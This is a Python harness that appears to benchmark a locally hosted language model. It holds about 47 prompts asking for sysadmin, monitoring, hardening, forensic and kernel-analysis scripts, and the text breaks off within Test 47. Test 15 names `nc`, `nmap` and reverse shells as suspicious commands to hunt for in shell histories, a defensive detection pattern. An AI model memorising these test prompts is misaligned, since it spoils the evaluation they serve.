import requests
import json
import time
import os
import textwrap

# 1. Configuration
API_URL = "http://127.0.0.1:8001/v1/chat/completions"
HEADERS = {
    "Content-Type": "application/json"
}
os.makedirs("test_results", exist_ok=True)

TEST_CASES = [
    # ========== ORIGINAL TESTS 1-30 ==========
    {
        "name": "Test 1: Proactive Resource Monitor",
        "prompt": """
Write a Python script that:
1. Uses `psutil` to find processes consuming >1GB RAM or >50% CPU for more than 60 seconds.
2. For each such process, gracefully sends a SIGTERM signal.
3. If the process does not terminate within 10 seconds, forcefully sends a SIGKILL signal.
4. Logs every action (detection, SIGTERM, SIGKILL) with PID, process name, and resource usage metrics to a JSON log file at `/var/log/resource_monitor.json`.
5. The script should run as a continuous daemon.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 2: High-Availability Container Stack",
        "prompt": """
Create a docker-compose.yml for a high-availability web service:
- Use Traefik as a reverse proxy that load balances two instances of a Python backend app.
- Traefik must handle automatic SSL certificate generation via Let's Encrypt for `app.example.com`.
- Include a PostgreSQL database with a persistent named volume for data.
- Include a Redis cache for session storage.
- Define strict resource limits (CPU/memory) and healthchecks for all services.
- Use Docker secrets to manage the database password.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 3: Advanced Firewall with IPSet",
        "prompt": """
Write a bash script to configure iptables using ipset for dynamic blocking:
1. Create an ipset hash named `dynamic_blacklist`.
2. Add an iptables rule to the INPUT chain to drop all traffic from IPs in the `dynamic_blacklist` set.
3. Create a second rule that logs and then adds the source IP to `dynamic_blacklist` if it attempts to connect to port 23 (telnet).
4. Add rules to allow SSH from a trusted network (10.0.0.0/8) and established connections.
5. Ensure the rules and the ipset persist across reboots.
Include comments for each step.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 4: Correlated Health Monitor",
        "prompt": """
Create a bash script that checks system health by correlating metrics:
- If CPU usage is >80% for 3 consecutive checks (10s apart), get the top 3 CPU-consuming PIDs and their command lines.
- If available memory is <500MB, check for kernel OOM killer messages in dmesg from the last hour.
- If disk usage on `/` is >85%, list the 10 largest directories within `/var/log`.
- If the 1-minute load average exceeds the number of CPU cores, log a critical warning with the current load and core count.
Output should be in a structured log format: "TIMESTAMP LEVEL [CHECK_NAME] Details..."
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 5: Forensic Security Snapshot",
        "prompt": """
Write a script that creates a forensic snapshot of the current system state:
1. Find all SUID/SGID binaries modified in the last 7 days.
2. List all active listening ports and the PIDs/names of the services using them.
3. Dump the command history for all currently logged-in users.
4. Hash the contents of `/etc/passwd` and `/etc/shadow` and store the hashes.
5. Package all findings into a single compressed tarball named `snapshot-HOSTNAME-YYYYMMDD.tar.gz`.
Report findings to stdout and write the detailed files into the tarball.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 6: Idempotent Database Backup & Restore",
        "prompt": """
Create a robust PostgreSQL management script that can be run with `backup` or `restore` arguments:
- `backup`: Dumps the 'production' database, encrypts the dump using GPG with a public key (`backup_key.pub`), and uploads it to an S3 bucket. The filename should be `backup-YYYYMMDD-HHMMSS.sql.gz.gpg`.
- `restore`: Lists available backups from the S3 bucket, prompts the user to choose one, downloads it, decrypts it with a GPG private key, and restores it to a new database named `production_restored_TIMESTAMP`.
- Both operations must be logged extensively.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 7: Stateful Service Manager",
        "prompt": """
Write a Python script using `systemd-python` that manages a set of services (`nginx`, `mysql`, `redis`):
1. Checks the state of each service.
2. If a service is 'failed', it should first try to restart it.
3. If it enters the 'failed' state again within 5 minutes, the script should not restart it again and instead send an alert (print to stderr).
4. If a service depends on another (e.g., app depends on mysql), it should ensure the dependency is active before starting the service.
5. Log all state changes and actions in a structured format.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 8: Advanced Network Path Diagnostics",
        "prompt": """
Create a network diagnostic script that:
1. Takes a domain name as an argument (e.g., 'google.com').
2. Performs a DNS lookup for A, AAAA, and MX records.
3. Uses `mtr` or `traceroute` to map the network path to the resolved A record IP.
4. For each hop in the path, it attempts to measure latency.
5. Checks if key ports (80, 443) are open on the final destination.
6. Formats the final output as a JSON object containing DNS results, the full path trace with latencies, and port status.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 9: Dynamic Log Rotation and Archiving",
        "prompt": """
Create a logrotate configuration for `/var/log/myapp/*.log` that:
- Rotates when the file size exceeds 50MB or daily, whichever comes first.
- Keeps 7 rotated logs locally, compressed.
- Has a `postrotate` script that reloads the app.
- Includes a `lastaction` script that runs after the rotation is complete to securely archive logs older than 7 days to a remote server using `rsync` over SSH.
- The user/group for new logs should be `myapp:myapp`.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 10: Systemd Service Monitor",
        "prompt": """
Instead of a bash script, write a systemd service unit file (`myapp-monitor.service`) and a corresponding timer unit (`myapp-monitor.timer`) to monitor a process:
1. The timer should trigger the service every 60 seconds.
2. The service unit should execute a script that checks if the 'myapp' process is running.
3. If not running, it should start `/usr/bin/myapp`.
4. Configure the main `myapp.service` to automatically restart on failure, but with a rate limit (`StartLimitBurst`) to prevent a restart loop. The monitor's job is to be a secondary check.
5. Explain how to enable and start the timer.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 11: Cryptographic Backup Verification",
        "prompt": """
Create a script that verifies the integrity of the latest backup in `/backup/`:
1. The backup directory contains data archives (`.tar.gz`) and a corresponding SHA256 checksum file (`.sha256`).
2. The script must find the latest archive and its checksum file.
3. It must recalculate the SHA256 hash of the archive and verify it against the contents of the checksum file.
4. If the hash matches, it should then extract the archive to a temporary location.
5. It then checks if a critical file, `/__CONFIG_VARS__`, exists within the extracted archive.
6. Reports success or failure and cleans up the temporary files.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 12: Proactive SSL Certificate Management",
        "prompt": """
Write a script that automates SSL certificate lifecycle management:
1. Scan a directory of nginx configuration files (`/etc/nginx/sites-enabled/`) to find all unique `server_name` directives.
2. For each domain found, check its live SSL certificate's expiration date.
3. If a certificate is expiring in less than 15 days, trigger a renewal using `certbot renew`.
4. After attempting renewals, verify that the renewal was successful by checking the new expiration date.
5. If and only if a certificate was successfully renewed, gracefully reload the nginx service.
6. Log all actions and send a summary email to an administrator.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 13: Intelligent Docker Cleanup Tool",
        "prompt": """
Create a Docker maintenance script with advanced logic:
1. Remove all stopped containers.
2. Remove dangling images and build cache.
3. Remove unused volumes, but first, check if the volume name matches a pattern (`pgdata-*` or `esdata-*`) and if so, prompt for confirmation before deletion.
4. Identify images that have not been used to run a container in the last 30 days and list them as candidates for removal.
5. Provide a `--force` flag to bypass all confirmation prompts.
6. Display a summary of reclaimed space, broken down by category (containers, images, volumes).
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 14: eBPF-based Performance Baseline",
        "prompt": """
Write a Python script using the `bcc` framework (eBPF) to capture a low-level performance baseline:
1. Trace new process creation (`exec()` syscalls) for 60 seconds.
2. Trace block I/O requests to show which processes are writing to disk.
3. Capture TCP connection initiations (connects).
4. Aggregate the captured data to show:
   - Top 5 most frequently executed commands.
   - Top 5 processes by I/O write volume.
   - Top 5 most frequently contacted destination IPs.
5. Output the final summary as a YAML file.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 15: User Audit with Anomaly Detection",
        "prompt": """
Create a user audit script that performs security checks and basic anomaly detection:
1. Identify all non-system user accounts.
2. For each user, check for passwordless sudo privileges in `/etc/sudoers.d/`.
3. Check the user's `.bash_history` for suspicious commands (e.g., `nc`, `nmap`, reverse shells).
4. ANOMALY: Flag any user account whose UID is < 1000 but is not a standard system account (like root, daemon, bin).
5. ANOMALY: Flag any user who owns files in `/tmp` that are SUID.
6. Format the output as a report with [PASS], [FAIL], and [ANOMALY] markers.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 16: Multi-Endpoint API Health Checker",
        "prompt": """
Write a concurrent API health checker in Python using `asyncio` and `aiohttp`:
1. Read a list of API endpoints and their expected success conditions from a YAML config file. (e.g., URL, expected status code, optional JSON key:value to check in response).
2. Concurrently check all endpoints.
3. Implement a retry mechanism with exponential backoff for failed checks (3 retries max).
4. If an endpoint is definitively down after retries, log a critical alert.
5. Expose the health status of all monitored endpoints via a simple local HTTP server on port 9100 (e.g., /metrics).
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 17: Git Repository State Management",
        "prompt": """
Create a git management script that can `save` or `restore` the state of a repository:
- `save`: Creates a named snapshot. It should record the current branch name, the latest commit hash, and the status of uncommitted changes (by creating a patch file). It stores this info in a local `.git/snapshots/` directory.
- `restore`: Lists all saved snapshots. When a snapshot name is provided, it checks for uncommitted changes (and fails if any exist), then checks out the specified commit hash and applies the corresponding patch file to restore the working directory state.
- Handle edge cases like being in a detached HEAD state.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 18: OS-Agnostic Update and Health Check",
        "prompt": """
Write an update script in Python that is OS-agnostic (works on Debian/Ubuntu and RHEL/CentOS/Fedora):
1. Detect the system's package manager (`apt`, `yum`, `dnf`).
2. Before updating, check for critical service health (e.g., is a database listener on port 5432 running?). If not, abort the update.
3. Perform a dry-run of the update to list pending packages.
4. Apply only security-related updates.
5. After updating, re-run the critical service health check to ensure nothing broke.
6. Log the entire process, including the list of updated packages, to a file.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 19: Process Sandboxing with Systemd",
        "prompt": """
Write a systemd service unit file to run an application (`/usr/local/bin/unsafe_app`) in a secure sandbox:
1. Use dynamic user (`DynamicUser=yes`) so it doesn't run as a persistent user.
2. Prevent the process from gaining new privileges.
3. Make the filesystem read-only except for a specific writable directory in `/var/lib/unsafe_app`.
4. Blacklist kernel modules like `bluetooth` and `usb-storage` from being loaded by the service.
5. Restrict network access to only allow outgoing TCP connections on port 443.
6. Add comments explaining what each security directive does.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 20: Graph-Based Service Dependency Analysis",
        "prompt": """
Write a Python script that models service dependencies as a directed graph:
1. Read a service dependency config file (e.g., `A: B, C`).
2. Build a graph representation (e.g., using the `networkx` library).
3. Given a target service to start (e.g., 'A'), determine and print its entire dependency chain in the correct start order.
4. Given a target service to stop (e.g., 'B'), determine and print all services that depend on it (the impact list).
5. Detect and report any circular dependencies in the graph, printing the cycle path.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 21: Intelligent Web Server Troubleshooter",
        "prompt": """
Create a troubleshooting script that diagnoses a web server issue:
1. It takes a URL as an argument.
2. It first checks local DNS resolution for the domain.
3. It then simulates the request path:
   - Checks connectivity to the local gateway.
   - Checks connectivity to the resolved IP.
   - Performs a full TLS handshake and validates the certificate chain using `openssl s_client`.
   - Makes an HTTP GET request and checks the HTTP status code and response headers.
4. Based on the point of failure, it should provide a specific hypothesis (e.g., "Failure at DNS lookup suggests a resolver issue" or "Failure at TLS handshake with 'certificate expired' error suggests an SSL issue").
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 22: Compliance Checker with Auto-Remediation",
        "prompt": """
Write a compliance script that checks system settings against a defined policy in a YAML file.
- The YAML file defines checks, expected values, and remediation commands.
- The script should:
  1. Parse the policy file.
  2. For each policy, check the current system state (e.g., check an sshd_config value, check a sysctl parameter).
  3. Report if the system is compliant or non-compliant for that policy.
  4. If a `--remediate` flag is passed, execute the defined remediation command for any non-compliant policies.
- Provide an example policy YAML for checking that `PermitRootLogin` is `no` in `sshd_config`.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 23: Dynamic Load Balancer Health Analysis",
        "prompt": """
Create a script that queries a load balancer's API (e.g., HAProxy's stats socket or Traefik's API) to perform a health analysis:
1. Fetch the list of all backend servers and their current status ('UP', 'DOWN').
2. For each 'UP' backend, check its current session count and request rate.
3. Identify 'hotspots': any backend handling >50% more sessions than the average of its peers.
4. Identify 'flapping': any backend that has changed state (UP to DOWN or vice-versa) more than 3 times in the last 10 minutes (requires storing state between runs).
5. Generate a JSON report with overall health, and lists of any identified 'hotspot' or 'flapping' backends.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 24: Proactive Database Performance Tuning",
        "prompt": """
Write a PostgreSQL script that analyzes performance and generates tuning recommendations:
1. Identify the top 5 most time-consuming queries from `pg_stat_statements`.
2. For each of those queries, generate an `EXPLAIN (ANALYZE, BUFFERS)` plan.
3. Analyze the query plans to detect common anti-patterns like sequential scans on large tables or nested loop joins with high row counts.
4. Check for unused indexes and bloated tables (high percentage of dead tuples).
5. Based on the findings, generate a report with specific, actionable recommendations, such as 'Recommendation: Create index on table `users` column `email`' or 'Recommendation: Run VACUUM FULL on table `events`'.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 25: Runtime Container Security Analysis",
        "prompt": """
Create a container security script that analyzes running containers for runtime threats:
1. For each running container, inspect its network namespace and identify any processes listening on `0.0.0.0`.
2. Use `docker exec` to run a check inside each container for newly created executable files in `/tmp` or `/var/tmp`.
3. Check the container's logs for anomalous patterns (e.g., repeated authentication failures, stack traces).
4. Cross-reference the running container image against a vulnerability database using `trivy` or a similar tool.
5. Generate a report prioritizing findings by container, with severity levels for each issue.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 26: Canary Deployment Automation",
        "prompt": """
Write a deployment script for a 'canary release' strategy:
1. It takes a new Docker image version as an argument.
2. It first deploys the new version to a single 'canary' instance.
3. It then runs a suite of integration tests against the canary instance.
4. Simultaneously, it monitors key metrics from the canary (e.g., error rate, latency) for 5 minutes.
5. If tests pass and metrics are stable, it proceeds to perform a rolling update of the main production pool with the new image.
6. If any step fails, it automatically rolls back by destroying the canary instance and logging the failure.
The script should interact with a container orchestrator's API or CLI (e.g., `docker-compose`, `kubectl`).
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 27: Ansible-Based System Hardening",
        "prompt": """
Create a modular Ansible playbook named `harden.yml` to enforce system security.
The playbook should be structured with roles:
1. A role named `ssh` that ensures `PermitRootLogin` and `PasswordAuthentication` are set to `no`.
2. A role named `firewall` that uses the `ufw` module to enable the firewall and allow only TCP traffic on ports 22, 80, and 443.
3. A role named `kernel` that uses the `sysctl` module to set `net.ipv4.ip_forward` to 0 and `net.ipv4.conf.all.accept_redirects` to 0.
4. The main `harden.yml` playbook should apply all three roles to a group of servers named `webservers`.
Include the necessary directory structure and example files for the roles.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 28: Multi-System Monitoring Integration",
        "prompt": """
Write a Python script that acts as a metric aggregator:
1. It queries a Prometheus endpoint to get the current rate of `http_requests_total`.
2. It connects to an InfluxDB database to get the latest `cpu_usage_idle` value.
3. It runs a local shell command to check the number of active `sshd` processes.
4. It combines these three disparate metrics into a single, cohesive JSON object.
5. If any data source fails, the corresponding JSON value should be `null`, but the script should not crash.
6. The final JSON object is pushed to a Slack webhook URL with a status summary.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 29: Automated Incident Response Playbook",
        "prompt": """
Create an automated incident response script that triggers when a specific alert is received (e.g., from a SIEM):
1. The script is invoked with a suspicious IP address and a PID.
2. It immediately captures a memory dump of the given PID using `gcore`.
3. It isolates the suspicious IP by adding a rule to a network ACL or `iptables` to block all traffic.
4. It gathers related evidence: active network connections from the PID, its open file handles (`lsof`), and its parent process tree.
5. It archives all evidence and the memory dump into an encrypted zip file, with the password stored in a secure vault.
6. It then attempts to gracefully terminate the process.
The script should be non-interactive and log every action with precise timestamps.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 30: Interactive Infrastructure CLI Report",
        "prompt": """
Build a terminal-based infrastructure report dashboard using a library like Python's `rich` or `blessed`.
1. The dashboard should have multiple panels that update in near real-time (e.g., every 5 seconds).
2. One panel should show overall service status (by pinging a list of hosts).
3. A second panel should display a scrolling table of the top 5 processes by CPU and memory usage.
4. A third panel should tail the last 10 lines of `/var/log/syslog`.
5. The application should handle user input: pressing 'q' should quit gracefully.
The output should be visually organized and use colors to indicate status (e.g., green for 'UP', red for 'DOWN').
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },

    # ========== KERNEL/SYSTEM INTERNALS TESTS (31-45) ==========
    {
        "name": "Test 31: Kernel Module Analysis",
        "prompt": """
Write a script that analyzes loaded kernel modules and their dependencies:
1. Parse /proc/modules to get all loaded modules with their memory usage, reference count, and dependencies
2. For each module, use modinfo to extract: version, description, author, license, and parameters
3. Identify modules that are loaded but have no dependent modules using them (ref count = 0)
4. Check if any third-party modules (not in /lib/modules/$(uname -r)/kernel) are loaded
5. Generate a graphviz dot file showing the module dependency tree with memory usage annotations
6. Flag any modules that have tainted the kernel and decode the taint flags (P=proprietary, O=out-of-tree, etc.)
7. Check for module signature verification status and report unsigned modules
Include proper parsing of kernel taint flags from /proc/sys/kernel/tainted.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 32: Memory Map Analysis",
        "prompt": """
Create a comprehensive process memory analyzer:
1. Parse /proc/PID/maps to understand the memory layout of a given process
2. Categorize memory regions: heap, stack, shared libraries, anonymous mappings, etc.
3. For each shared library, check if ASLR is effective by comparing load addresses
4. Identify potentially suspicious memory regions (RWX permissions, unusual paths)
5. Calculate actual memory usage using /proc/PID/smaps including PSS (Proportional Set Size)
6. Detect memory leaks by tracking anonymous memory growth over time
7. Generate a visual representation of the memory layout with security annotations
8. Check for common injection patterns (e.g., memory regions not backed by files)
Include detection of process hollowing and other memory-based attack indicators.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 33: Syscall Tracing and Analysis",
        "prompt": """
Build a syscall analysis tool using ptrace:
1. Attach to a running process and trace all system calls
2. Categorize syscalls by type: file I/O, network, process management, memory, etc.
3. Track file descriptors throughout their lifecycle (open->read/write->close)
4. Detect suspicious patterns: excessive failed syscalls, privilege escalation attempts
5. Build a syscall frequency histogram and identify anomalies
6. Track time spent in each syscall and identify performance bottlenecks
7. Generate a timeline of security-relevant events (file access, network connections, exec calls)
8. Implement syscall filtering to reduce noise (e.g., ignore certain common syscalls)
Output both a detailed log and a summary report with security and performance insights.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 34: CPU Performance Counter Analysis",
        "prompt": """
Write a script using perf_event_open to access CPU performance counters:
1. Set up performance counters for: cache misses, branch mispredictions, CPU cycles, instructions
2. Monitor these counters for a target process or system-wide
3. Calculate derived metrics: IPC (instructions per cycle), cache hit rate, branch prediction accuracy
4. Detect performance anomalies that might indicate security issues (e.g., cache side-channel attacks)
5. Track context switches and their impact on cache performance
6. Monitor CPU frequency scaling and thermal throttling events
7. Correlate performance degradation with system events (I/O, interrupts)
8. Generate alerts for abnormal performance patterns that could indicate crypto-mining or DoS
Include proper handling of counter overflow and multiplexing.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 35: Block Device I/O Analysis", 
        "prompt": """
Create a comprehensive block device I/O analyzer:
1. Parse /sys/block/*/stat to get detailed I/O statistics for all block devices
2. Calculate IOPS, throughput, average request size, and queue depth
3. Monitor I/O latency using /proc/diskstats and identify slow devices
4. Track I/O patterns: sequential vs random, read vs write ratios
5. Use blktrace to capture detailed I/O traces and analyze request merging efficiency
6. Identify processes generating the most I/O using /proc/PID/io
7. Detect I/O storms and correlate with system events
8. Monitor device mapper statistics for LVM/RAID performance
9. Check for I/O errors and failing devices in kernel logs
Generate both real-time metrics and historical analysis with anomaly detection.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 36: Network Stack Internals",
        "prompt": """
Build a deep network stack analyzer:
1. Parse /proc/net/* to extract detailed network statistics
2. Monitor TCP connection states and detect anomalies (SYN floods, TIME_WAIT accumulation)
3. Track network buffer usage (socket buffers, ring buffers) and detect exhaustion
4. Analyze netfilter connection tracking table for NAT/firewall performance
5. Monitor interrupt distribution across CPUs for network interfaces
6. Track TCP retransmissions, out-of-order packets, and duplicate ACKs
7. Detect network stack tuning issues (small buffers, suboptimal congestion control)
8. Use ss and netstat data to identify connection leaks
9. Monitor network namespace usage and inter-namespace communication
Include eBPF hooks to trace packet flow through the network stack.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 37: Process Scheduler Analysis",
        "prompt": """
Create a process scheduler analyzer:
1. Monitor /proc/sched_debug to understand scheduler behavior
2. Track process migration between CPUs and NUMA nodes
3. Analyze scheduling latency and identify processes experiencing starvation
4. Monitor real-time process behavior and deadline misses
5. Track CPU affinity settings and their effectiveness
6. Identify priority inversion scenarios
7. Monitor cgroup CPU accounting and quota enforcement
8. Analyze the impact of kernel preemption on latency-sensitive workloads
9. Detect scheduler anomalies that might indicate malicious activity
Generate recommendations for scheduler tuning based on workload characteristics.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 38: Virtual Memory Subsystem Analysis",
        "prompt": """
Develop a comprehensive virtual memory analyzer:
1. Parse /proc/vmstat and /proc/meminfo to track memory subsystem behavior
2. Monitor page fault rates (minor vs major) and their impact on performance
3. Track swap usage patterns and identify thrashing conditions
4. Analyze transparent huge page (THP) usage and effectiveness
5. Monitor memory compaction events and fragmentation levels
6. Track dirty page writeback behavior and I/O patterns
7. Analyze NUMA memory allocation and migration statistics
8. Detect memory pressure situations before OOM killer activation
9. Monitor kernel memory usage (slab allocator statistics)
Include predictive analytics for memory exhaustion scenarios.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 39: Security Module Integration",
        "prompt": """
Write a script to analyze Linux Security Module (LSM) configurations:
1. Detect which LSMs are active (SELinux, AppArmor, SMACK, etc.)
2. For SELinux: analyze policy violations in audit log, check for domains in permissive mode
3. For AppArmor: parse loaded profiles, check for complain mode profiles
4. Analyze capability usage by processes (both effective and permitted)
5. Check for processes with dangerous capability combinations
6. Monitor security module state changes and policy reloads
7. Track security context transitions and domain changes
8. Identify processes running unconfined or with elevated privileges
9. Generate a security posture report with remediation recommendations
Include integration with auditd for comprehensive security event tracking.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 40: Interrupt and IRQ Analysis",
        "prompt": """
Build an interrupt handling analyzer:
1. Parse /proc/interrupts to track interrupt distribution across CPUs
2. Identify interrupt storms and their sources
3. Monitor IRQ affinity settings and balance effectiveness
4. Track softirq processing time and identify bottlenecks
5. Analyze MSI/MSI-X interrupt usage for PCI devices
6. Detect interrupt sharing conflicts affecting performance
7. Monitor threaded IRQ handler performance
8. Track interrupt coalescing effectiveness for network interfaces
9. Identify real-time latency issues caused by interrupt handling
Generate recommendations for interrupt tuning and CPU isolation.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 41: Filesystem Internal Analysis",
        "prompt": """
Create a filesystem internals analyzer:
1. For ext4: analyze journal status, inode usage, and fragmentation levels
2. For XFS: monitor allocation groups, delayed allocation, and log performance
3. For Btrfs: check scrub status, balance operations, and snapshot overhead
4. Track inode cache and dentry cache effectiveness
5. Monitor filesystem-specific caches and their hit rates
6. Analyze mount options and their performance/security implications
7. Detect filesystem corruption indicators in kernel logs
8. Track filesystem freeze/thaw operations and their impact
9. Monitor quota usage and enforcement
Include filesystem-specific health checks and optimization recommendations.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 42: Control Group (cgroup) Deep Dive",
        "prompt": """
Build a comprehensive cgroup analyzer for both v1 and v2:
1. Map the complete cgroup hierarchy and controller attachments
2. Track resource usage (CPU, memory, I/O) per cgroup with historical data
3. Monitor cgroup limit enforcement and throttling events
4. Detect cgroup escape attempts and privilege escalation
5. Analyze systemd slice/scope/service resource consumption
6. Track cgroup migration events and their performance impact
7. Monitor memory pressure notifications (cgroup v2)
8. Analyze CPU bandwidth control and quota burn rates
9. Detect resource starvation within cgroups
10. Generate alerts for cgroup-based resource attacks
Include visualization of the cgroup hierarchy with resource usage heatmaps.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 43: Kernel Keyring Analysis",
        "prompt": """
Write a kernel keyring security analyzer:
1. Enumerate all keyrings (session, process, thread, user, user-session)
2. List keys in each keyring with their types, descriptions, and permissions
3. Identify expired or revoked keys still in keyrings
4. Check for overly permissive key access permissions
5. Track key usage patterns and access attempts
6. Monitor keyring quota usage and potential DoS vectors
7. Detect suspicious key types or descriptions (potential malware indicators)
8. Analyze encrypted key dependencies and trust chains
9. Check for keys that should be in kernel lockdown
Include integration with IMA/EVM for system integrity verification.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 44: NUMA System Optimization",
        "prompt": """
Create a NUMA-aware system optimizer:
1. Map system NUMA topology including nodes, CPUs, and memory
2. Analyze per-node memory usage and identify imbalances
3. Track inter-node memory access latency and bandwidth
4. Monitor NUMA page migration statistics and effectiveness
5. Identify processes with poor NUMA locality
6. Generate optimal CPU/memory pinning recommendations
7. Analyze NUMA-aware scheduler decisions
8. Track remote memory access penalties
9. Monitor kernel NUMA balancing effectiveness
10. Detect NUMA-related performance regressions
Include automated NUMA policy recommendations for different workload types.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 45: Boot Process Security Analysis",
        "prompt": """
Build a comprehensive boot security analyzer:
1. Verify secure boot status and certificate chains
2. Analyze UEFI variables for persistence mechanisms
3. Check kernel command line for security-relevant parameters
4. Verify initramfs integrity and contents
5. Track module loading during boot and verify signatures
6. Analyze systemd boot performance and security status
7. Check for firmware vulnerabilities and available updates
8. Monitor TPM usage and PCR values
9. Verify dm-verity or dm-integrity usage for root filesystem
10. Detect boot-time malware indicators
Generate a boot security score with specific hardening recommendations.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },

    # ========== LARGE CONTEXT TESTS (46-55) ==========
    {
        "name": "Test 46: Comprehensive System Trace Analysis",
        "prompt": """
Analyze this 8000-line strace output from a complex multi-threaded application experiencing intermittent failures:

[Begin strace output - in production this would be real trace data]
execve("/usr/bin/app", ["app", "--daemon"], 0x7ffe93847840 /* 26 vars */) = 0
brk(NULL)                               = 0x560f2a9e2000
arch_prctl(0x3001 /* ARCH_??? */, 0x7ffde3b8c8a0) = -1 EINVAL
mmap(NULL, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f6a0e4aa000
... [8000 more lines of syscalls including clone(), futex(), epoll_wait(), etc.]
[End strace output]

Analyze this trace to:
1. Map out all threads created and their relationships
2. Identify all file descriptors opened, their types (files/sockets/pipes), and lifecycle
3. Find race conditions between threads (especially around shared resources)
4. Detect any TOCTOU (Time-of-check Time-of-use) vulnerabilities
5. Map all network connections: when established, data transferred, and how closed
6. Identify failed system calls and categorize them by type and frequency
7. Find potential security issues: privilege changes, unsafe file operations, etc.
8. Create a timeline of significant events with thread correlation
9. Identify performance bottlenecks: blocking calls, repeated failures, etc.
10. Generate specific line number references for each finding
Output a comprehensive security and performance assessment report.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 47: Kernel Oops/Panic Analysis",
        "prompt": """
Analyze this complete kernel panic dump and provide root cause analysis:

[Begin kernel panic dump - in production this would be real panic data]
BUG: unable to handle kernel NULL pointer dereference at 0000000000000028
IP: [<ffffffffa0358f61>] my_driver_ioctl+0x41/0x280 [my_driver]
PGD 1a0b4a067 P4D 1a0b4a067 PUD 1a0b49067 PMD 0
Oops: 0000 [#1] SMP PTI
CPU: 3 PID: 28239 Comm: test_app Tainted: G           O    4.15.0-200-generic
Hardware name: Dell Inc. PowerEdge R740/08D89F, BIOS 2.12.2 07/09/2021
